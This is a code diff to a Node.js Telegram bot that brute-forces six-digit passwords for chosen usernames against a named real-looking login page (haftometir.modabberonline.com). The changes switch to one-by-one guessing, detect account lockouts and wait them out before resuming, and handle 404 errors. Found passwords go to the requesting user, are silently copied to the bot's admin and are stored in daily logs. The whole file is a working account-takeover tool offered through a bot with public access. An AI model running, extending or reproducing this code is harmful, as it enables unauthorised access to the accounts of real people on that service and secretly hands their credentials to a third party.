@@ -9,12 +9,12 @@ const express = require("express");
 const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 const LOGIN_URL =
+  process.env.LOGIN_URL ||
   "https://haftometir.modabberonline.com/Login.aspx?ReturnUrl=%2f&AspxAutoDetectCookieSupport=1";
 const PORT = process.env.PORT || 3000;
 
 const START = 0;
 const END = 999999;
-const CONCURRENT_REQUESTS = 10;
 const BATCH_DELAY = 100;
 const LOCK_RETRY_DELAY = 5 * 60 * 1000;
 const DAILY_REPORT_HOUR = 0;
@@ -224,6 +224,17 @@ async function tryLogin(username, password) {
 
   try {
     const loginPageResponse = await client.get(LOGIN_URL);
+
+    if (loginPageResponse.status === 404) {
+      console.log(`❌ ERROR - Login URL not found (404): ${LOGIN_URL}`);
+      return {
+        success: false,
+        message: "Login page not found (404)",
+        password,
+        isError: true,
+      };
+    }
+
     const $ = cheerio.load(loginPageResponse.data);
 
     const formData = new URLSearchParams();
@@ -247,7 +258,7 @@ async function tryLogin(username, password) {
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
       },
       maxRedirects: 0,
-      validateStatus: (status) => status >= 200 && status < 400,
+      validateStatus: (status) => status >= 200 && status < 500,
     });
 
     const $response = cheerio.load(loginResponse.data);
@@ -287,9 +298,7 @@ async function tryLogin(username, password) {
 
     if (loginResponse.status === 302 || loginResponse.status === 301) {
       botStats.totalSuccess++;
-      console.log(
-        `✅ SUCCESS - Username: ${username} | Password: ${password} | Status: Redirected`
-      );
+      console.log(`✅ SUCCESS - Username: ${username} | Password: ${password}`);
       return { success: true, message: "Redirected", password };
     }
 
@@ -300,19 +309,25 @@ async function tryLogin(username, password) {
     }
 
     botStats.totalSuccess++;
-    console.log(
-      `✅ SUCCESS - Username: ${username} | Password: ${password} | Status: Logged in`
-    );
+    console.log(`✅ SUCCESS - Username: ${username} | Password: ${password}`);
     return { success: true, message: "Logged in", password };
   } catch (error) {
     botStats.totalRequests++;
 
     if (error.response && error.response.status === 302) {
       botStats.totalSuccess++;
-      console.log(
-        `✅ SUCCESS - Username: ${username} | Password: ${password} | Status: Redirect`
-      );
+      console.log(`✅ SUCCESS - Username: ${username} | Password: ${password}`);
       return { success: true, message: "Redirect", password };
+    }
+
+    if (error.response && error.response.status === 404) {
+      console.log(`❌ ERROR - Login URL not found (404): ${LOGIN_URL}`);
+      return {
+        success: false,
+        message: "Login page not found (404)",
+        password,
+        isError: true,
+      };
     }
 
     if (error.code === "ECONNABORTED" || error.message.includes("timeout")) {
@@ -364,9 +379,11 @@ async function bruteForceUsername(username, chatId) {
     chatId: chatId,
     successCount: 0,
     failedCount: 0,
+    lockedCount: 0,
     processedCount: 0,
+    currentPassword: "000000",
     startTime: Date.now(),
-    lastUpdate: Date.now(),
+    lastTests: [],
   };
 
   runningTasks.set(username, task);
@@ -377,15 +394,13 @@ async function bruteForceUsername(username, chatId) {
     `🔑 Range: ${START.toString().padStart(6, "0")} - ${END.toString().padStart(
       6,
       "0"
-    )}\n` +
-    `⚡ Concurrent: ${CONCURRENT_REQUESTS}`;
+    )}`;
 
   await bot.sendMessage(chatId, startMessage, { parse_mode: "Markdown" });
 
   console.log(`\n🚀 ===== TEST STARTED =====`);
   console.log(`👤 Username: ${username}`);
   console.log(`🔑 Range: ${START} - ${END}`);
-  console.log(`⚡ Concurrent: ${CONCURRENT_REQUESTS}`);
   console.log(`===========================\n`);
 
   if (chatId.toString() !== ADMIN_CHAT_ID) {
@@ -396,117 +411,142 @@ async function bruteForceUsername(username, chatId) {
     );
   }
 
-  for (let i = START; i <= END; i += CONCURRENT_REQUESTS) {
+  for (let i = START; i <= END; i++) {
     if (!runningTasks.has(username) || !runningTasks.get(username).isRunning) {
       await bot.sendMessage(
         chatId,
-        `🛑 *Test Stopped*\n\n👤 Username: \`${username}\``,
+        `🛑 *Test Stopped*\n\n👤 Username: \`${username}\`\n🔑 Last Password: \`${task.currentPassword}\``,
         { parse_mode: "Markdown" }
       );
-      console.log(`🛑 Test stopped for ${username}`);
+      console.log(
+        `🛑 Test stopped for ${username} at password ${task.currentPassword}`
+      );
       runningTasks.delete(username);
       return;
     }
 
-    const batch = [];
+    const password = i.toString().padStart(6, "0");
+    task.currentPassword = password;
 
-    for (let j = 0; j < CONCURRENT_REQUESTS && i + j <= END; j++) {
-      const password = (i + j).toString().padStart(6, "0");
-      batch.push(tryLogin(username, password));
+    const result = await tryLogin(username, password);
+    task.processedCount++;
+
+    const testResult = {
+      password: password,
+      status: result.success
+        ? "SUCCESS"
+        : result.isLocked
+        ? "LOCKED"
+        : "FAILED",
+      time: new Date().toISOString(),
+    };
+
+    task.lastTests.push(testResult);
+    if (task.lastTests.length > 20) {
+      task.lastTests.shift();
     }
 
-    const results = await Promise.all(batch);
-    let batchHasLock = false;
+    if (result.isError) {
+      await bot.sendMessage(
+        chatId,
+        `❌ *Error: Login page not found!*\n\n` +
+          `Please check LOGIN_URL in your config.\n` +
+          `Current URL: \`${LOGIN_URL}\`\n\n` +
+          `Test stopped.`,
+        { parse_mode: "Markdown" }
+      );
+      console.log(`❌ 404 Error - Stopping test for ${username}`);
+      runningTasks.delete(username);
+      return;
+    }
 
-    for (const result of results) {
-      task.processedCount++;
+    if (result.isLocked) {
+      task.lockedCount++;
 
-      if (result.isLocked) {
-        batchHasLock = true;
-
-        const lockMessage =
-          `🔒 *Account Locked!*\n\n` +
+      await bot.sendMessage(
+        chatId,
+        `🔒 *Account Locked!*\n\n` +
           `👤 Username: \`${username}\`\n` +
           `🔑 Password: \`${result.password}\`\n` +
-          `⏰ Waiting ${LOCK_RETRY_DELAY / 1000 / 60} minutes...`;
+          `⏰ Waiting ${LOCK_RETRY_DELAY / 1000 / 60} minutes...`,
+        { parse_mode: "Markdown" }
+      );
 
-        await bot.sendMessage(chatId, lockMessage, { parse_mode: "Markdown" });
-        console.log(`\n🔒 ===== ACCOUNT LOCKED =====`);
-        console.log(`👤 Username: ${username}`);
-        console.log(`🔑 Password: ${result.password}`);
-        console.log(`⏰ Waiting ${LOCK_RETRY_DELAY / 1000 / 60} minutes...`);
-        console.log(`==============================\n`);
+      console.log(`\n🔒 ===== ACCOUNT LOCKED =====`);
+      console.log(`👤 Username: ${username}`);
+      console.log(`🔑 Password: ${result.password}`);
+      console.log(`⏰ Waiting ${LOCK_RETRY_DELAY / 1000 / 60} minutes...`);
+      console.log(`==============================\n`);
 
+      await sleep(LOCK_RETRY_DELAY);
+
+      let stillLocked = await checkIfStillLocked(username);
+
+      while (stillLocked && runningTasks.get(username)?.isRunning) {
+        await bot.sendMessage(
+          chatId,
+          `⏰ Still locked: \`${username}\`\nWaiting ${
+            LOCK_RETRY_DELAY / 1000 / 60
+          } more minutes...`,
+          { parse_mode: "Markdown" }
+        );
+        console.log(
+          `⏰ Still locked: ${username} - Waiting ${
+            LOCK_RETRY_DELAY / 1000 / 60
+          } more minutes...`
+        );
         await sleep(LOCK_RETRY_DELAY);
-
-        let stillLocked = await checkIfStillLocked(username);
-
-        while (stillLocked && runningTasks.get(username)?.isRunning) {
-          await bot.sendMessage(
-            chatId,
-            `⏰ Still locked: \`${username}\`\nWaiting ${
-              LOCK_RETRY_DELAY / 1000 / 60
-            } more minutes...`,
-            { parse_mode: "Markdown" }
-          );
-          console.log(
-            `⏰ Still locked: ${username} - Waiting ${
-              LOCK_RETRY_DELAY / 1000 / 60
-            } more minutes...`
-          );
-          await sleep(LOCK_RETRY_DELAY);
-          stillLocked = await checkIfStillLocked(username);
-        }
-
-        if (runningTasks.get(username)?.isRunning) {
-          await bot.sendMessage(
-            chatId,
-            `✅ Lock released: \`${username}\` - Continuing...`,
-            { parse_mode: "Markdown" }
-          );
-          console.log(`✅ Lock released for ${username} - Continuing...\n`);
-          i -= CONCURRENT_REQUESTS;
-        }
-        break;
+        stillLocked = await checkIfStillLocked(username);
       }
 
-      if (result.success) {
-        task.successCount++;
-
-        const successMessage =
-          `🎉 *Password Found!*\n\n` +
-          `👤 Username: \`${username}\`\n` +
-          `🔑 Password: \`${result.password}\`\n` +
-          `✅ ${result.message}`;
-
-        await bot.sendMessage(chatId, successMessage, {
-          parse_mode: "Markdown",
-        });
-
-        console.log(`\n🎉 ===== PASSWORD FOUND! =====`);
-        console.log(`👤 Username: ${username}`);
-        console.log(`🔑 Password: ${result.password}`);
-        console.log(`✅ Status: ${result.message}`);
-        console.log(`==============================\n`);
-
-        dailyLog.successfulLogins.push({
-          username: username,
-          password: result.password,
-          userId: chatId,
-          time: new Date().toISOString(),
-        });
-
-        if (chatId.toString() !== ADMIN_CHAT_ID) {
-          await sendTelegram(successMessage + `\n\n🆔 User ID: \`${chatId}\``);
-        }
-      } else {
-        task.failedCount++;
+      if (runningTasks.get(username)?.isRunning) {
+        await bot.sendMessage(
+          chatId,
+          `✅ Lock released: \`${username}\` - Continuing from \`${password}\`...`,
+          { parse_mode: "Markdown" }
+        );
+        console.log(
+          `✅ Lock released for ${username} - Continuing from ${password}...\n`
+        );
       }
+
+      continue;
     }
 
-    if (!batchHasLock && i + CONCURRENT_REQUESTS <= END) {
-      await sleep(BATCH_DELAY);
+    if (result.success) {
+      task.successCount++;
+
+      const successMessage =
+        `🎉 *Password Found!*\n\n` +
+        `👤 Username: \`${username}\`\n` +
+        `🔑 Password: \`${result.password}\`\n` +
+        `✅ ${result.message}`;
+
+      await bot.sendMessage(chatId, successMessage, {
+        parse_mode: "Markdown",
+      });
+
+      console.log(`\n🎉 ===== PASSWORD FOUND! =====`);
+      console.log(`👤 Username: ${username}`);
+      console.log(`🔑 Password: ${result.password}`);
+      console.log(`✅ Status: ${result.message}`);
+      console.log(`==============================\n`);
+
+      dailyLog.successfulLogins.push({
+        username: username,
+        password: result.password,
+        userId: chatId,
+        time: new Date().toISOString(),
+      });
+
+      if (chatId.toString() !== ADMIN_CHAT_ID) {
+        await sendTelegram(successMessage + `\n\n🆔 User ID: \`${chatId}\``);
+      }
+    } else {
+      task.failedCount++;
     }
+
+    await sleep(BATCH_DELAY);
   }
 
   const totalTime = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);
@@ -514,9 +554,10 @@ async function bruteForceUsername(username, chatId) {
   const finalMessage =
     `✅ *Test Completed*\n\n` +
     `👤 Username: \`${username}\`\n` +
-    `📊 Total: ${task.processedCount}\n` +
+    `📊 Total Tested: ${task.processedCount}\n` +
     `✅ Success: ${task.successCount}\n` +
     `❌ Failed: ${task.failedCount}\n` +
+    `🔒 Locked: ${task.lockedCount}\n` +
     `⏱️ Time: ${totalTime} min`;
 
   await bot.sendMessage(chatId, finalMessage, { parse_mode: "Markdown" });
@@ -526,6 +567,7 @@ async function bruteForceUsername(username, chatId) {
   console.log(`📊 Total Tested: ${task.processedCount}`);
   console.log(`✅ Success: ${task.successCount}`);
   console.log(`❌ Failed: ${task.failedCount}`);
+  console.log(`🔒 Locked: ${task.lockedCount}`);
   console.log(`⏱️ Time: ${totalTime} minutes`);
   console.log(`=============================\n`);
 
@@ -757,6 +799,22 @@ bot.on("message", (msg) => {
   logReceivedMessage(msg);
 });
 
+bot.on("polling_error", (error) => {
+  console.log(`\n⚠️ ===== TELEGRAM BOT ERROR =====`);
+  console.log(`Error Code: ${error.code}`);
+  console.log(`Message: ${error.message}`);
+  if (error.code === "ETELEGRAM" && error.message.includes("401")) {
+    console.log(`\n🔴 SOLUTION: Your TELEGRAM_BOT_TOKEN is invalid!`);
+    console.log(`1. Go to @BotFather on Telegram`);
+    console.log(`2. Send /mybots`);
+    console.log(`3. Select your bot`);
+    console.log(`4. Click "API Token"`);
+    console.log(`5. Copy the new token to your .env file`);
+    console.log(`6. Restart the bot\n`);
+  }
+  console.log(`================================\n`);
+});
+
 bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
   const access = hasAccess(chatId);
@@ -803,7 +861,7 @@ bot.onText(/\/start/, async (msg) => {
 
 /add \`username\` - Add and start test
 /stop \`username\` - Stop specific test
-/list - List running tests
+/list - View last 10 tests for running tasks
 /status - Overall status
 /help - Help guide
 
@@ -917,9 +975,13 @@ bot.onText(/\/stop (.+)/, async (msg, match) => {
 
   task.isRunning = false;
 
-  bot.sendMessage(chatId, `🛑 Stopping \`${username}\`...`, {
-    parse_mode: "Markdown",
-  });
+  bot.sendMessage(
+    chatId,
+    `🛑 Stopping \`${username}\`...\n🔑 Last password: \`${task.currentPassword}\``,
+    {
+      parse_mode: "Markdown",
+    }
+  );
 });
 
 bot.onText(/\/list/, async (msg) => {
@@ -935,23 +997,38 @@ bot.onText(/\/list/, async (msg) => {
   let hasAnyTask = false;
 
   runningTasks.forEach((task, username) => {
-    const elapsed = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);
-    const progress = ((task.processedCount / (END - START + 1)) * 100).toFixed(
-      1
-    );
-
     if (
       access.isAdmin ||
       (task.chatId && task.chatId.toString() === chatId.toString())
     ) {
       hasAnyTask = true;
+      const elapsed = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);
+      const progress = (
+        (task.processedCount / (END - START + 1)) *
+        100
+      ).toFixed(1);
+
       message += `👤 \`${username}\`\n`;
+      message += `   🔑 Current: \`${task.currentPassword}\`\n`;
       message += `   📊 Progress: ${progress}%\n`;
       message += `   ✅ Success: ${task.successCount}\n`;
+      message += `   🔒 Locked: ${task.lockedCount}\n`;
       message += `   ⏱️ Time: ${elapsed}m\n`;
-      if (access.isAdmin && task.chatId) {
-        message += `   🆔 User: \`${task.chatId}\`\n`;
+
+      if (task.lastTests.length > 0) {
+        message += `\n   📝 *Last 10 Tests:*\n`;
+        const last10 = task.lastTests.slice(-10);
+        last10.forEach((test) => {
+          const emoji =
+            test.status === "SUCCESS"
+              ? "✅"
+              : test.status === "LOCKED"
+              ? "🔒"
+              : "❌";
+          message += `   ${emoji} \`${test.password}\` - ${test.status}\n`;
+        });
       }
+
       message += `\n`;
     }
   });
@@ -1277,35 +1354,34 @@ bot.onText(/\/help/, async (msg) => {
 
 *1️⃣ Add username:*
 \`/add 0123456789\`
-Test starts immediately and runs concurrently
+Test starts immediately (one by one)
 
 *2️⃣ Stop username:*
 \`/stop 0123456789\`
-Only stops this specific test
+Immediately stops the test
 
 *3️⃣ List active tests:*
 \`/list\`
-Shows what's currently running
+Shows current password and last 10 tests
 
 *4️⃣ Overall status:*
 \`/status\`
 
 ⚙️ *Settings:*
 • Password Range: ${START} - ${END}
-• Concurrent: ${CONCURRENT_REQUESTS}
+• Sequential Testing: One password at a time
 • Lock Retry: ${LOCK_RETRY_DELAY / 1000 / 60} minutes
 
 ${
   access.isAdmin
-    ? `\n🔧 *Admin Commands:*\n\n*5️⃣ Toggle public access:*\n\`/allaccess\` - Enable/disable for everyone\n\n*6️⃣ Grant user access:*\n\`/access <user_id>\` - Example: \`/access 123456789\`\n\n*7️⃣ Revoke user access:*\n\`/revoke <user_id>\` - Example: \`/revoke 123456789\`\n\n*8️⃣ List users:*\n\`/users\` - Show authorized and used users\n\n*9️⃣ Today's report:*\n\`/todaylog\` - View today's stats and logs\n\n*🔟 Full reset:*\n\`/resetall\` - Stop all tests and clear lists\n\n📊 *Auto Reporting:*\n• Daily report sent at ${DAILY_REPORT_HOUR}:00\n• Includes: requests, new users, passwords, messages`
+    ? `\n🔧 *Admin Commands:*\n\n*5️⃣ Toggle public access:*\n\`/allaccess\`\n\n*6️⃣ Grant user access:*\n\`/access <user_id>\`\n\n*7️⃣ Revoke user access:*\n\`/revoke <user_id>\`\n\n*8️⃣ List users:*\n\`/users\`\n\n*9️⃣ Today's report:*\n\`/todaylog\`\n\n*🔟 Full reset:*\n\`/resetall\`\n\n📊 *Auto Reporting:*\n• Daily report sent at ${DAILY_REPORT_HOUR}:00`
     : `\n⚠️ *Limitation:*\nYou can only use this bot once!\n\n🆔 Your ID: \`${chatId}\``
 }
 
 💡 *Tips:*
-✓ You can add multiple usernames simultaneously
-✓ Each runs independently
-✓ Stop only affects that specific test
-✓ You'll be notified when password is found
+✓ Each password is tested one by one
+✓ /list shows last 10 tests with status
+✓ Test continues in background
 ✓ Auto-waits when account is locked
   `;
 
@@ -1315,13 +1391,15 @@ ${
 setupDailyReport();
 
 app.listen(PORT, () => {
-  console.log("🤖 Telegram Bot started!");
+  console.log("\n🤖 ===== BOT STARTED =====");
   console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
-  console.log(`🌐 Express Server running on port ${PORT}`);
-  console.log(`✅ Health check: http://localhost:${PORT}/health`);
+  console.log(`🌐 Express Server: http://localhost:${PORT}`);
+  console.log(`✅ Health: http://localhost:${PORT}/health`);
   console.log(`📊 Stats: http://localhost:${PORT}/stats`);
   console.log(
     `🔓 Public Access: ${publicAccessEnabled ? "Enabled" : "Disabled"}`
   );
-  console.log(`📊 Daily Report: Every day at ${DAILY_REPORT_HOUR}:00`);
+  console.log(`📊 Daily Report: ${DAILY_REPORT_HOUR}:00`);
+  console.log(`🔑 Login URL: ${LOGIN_URL}`);
+  console.log("==========================\n");
 });
